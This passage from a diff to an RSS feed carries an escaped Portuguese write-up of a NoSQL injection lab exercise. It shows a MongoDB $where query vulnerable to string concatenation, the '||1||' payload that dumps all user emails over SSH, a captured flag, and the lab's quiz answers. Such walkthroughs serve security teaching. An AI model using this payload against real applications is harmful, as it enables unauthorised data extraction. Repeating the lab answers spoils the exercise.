+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last login: Wed Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; 03:34:24 &lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt; from 192.168.100.250
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pedro@nosql-nolife:~$ cat flag.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;N0Sql_n01iF3!&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pedro@nosql-nolife:~$ &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h2 data-hextra-search-id=&#34;syntax-injection-identification-and-data-extraction&#34;&gt;Syntax Injection: Identification and Data Extraction&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;syntax-injection-identification-and-data-extraction&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#syntax-injection-identification-and-data-extraction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A aplicação retorna o e-mail de qualquer usuário.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-sintax.png&#34; alt=&#34;Syntax&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Podemos testar se aplicação é vulnerável a injeção com um &lt;code&gt;&#39;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-application.png&#34; alt=&#34;Application&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Com a mensagem acima sabemos que a aplicação não realiza as devidas verificações, olhando o código da aplicação, a string passada é concatenada na consulta.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;for x in mycol.find({&amp;quot;$where&amp;quot;: &amp;quot;this.username == &#39;&amp;quot; + username + &amp;quot;&#39;&amp;quot;}):&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Sendo assim, podemos realizar uma condição verdadeira e verificar o retorno.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@ip-10-10-4-224:~# ssh syntax@10.10.201.31
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;syntax@10.10.201.31&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s password: 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Please provide the username to receive their email:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin@nosql.int
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pcollins@nosql.int
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jsmith@nosql.int
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Syntax@Injection.FTW
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection to 10.10.201.31 closed.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@ip-10-10-4-224:~# &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;É retornado todos os e-mails da aplicação, dessa forma, realizamos o dump de todos os e-mail.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What common character is used to test for injection in both SQL and NoSQL solutions?&lt;/strong&gt;&lt;br&gt;
+R:&lt;code&gt;&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the email value of the super secret user returned in the last entry?&lt;/strong&gt;&lt;br&gt;
+R:&lt;code&gt;Syntax@Injection.FTW&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;conclusão&#34;&gt;Conclusão&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;conclusão&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#conclus%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Na aula é apresentado diversas formas de NoSQL injection, de uma forma teórica e prática, apresentando a exploração de operadores e sintaxe.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+  </channel>
+</rss>
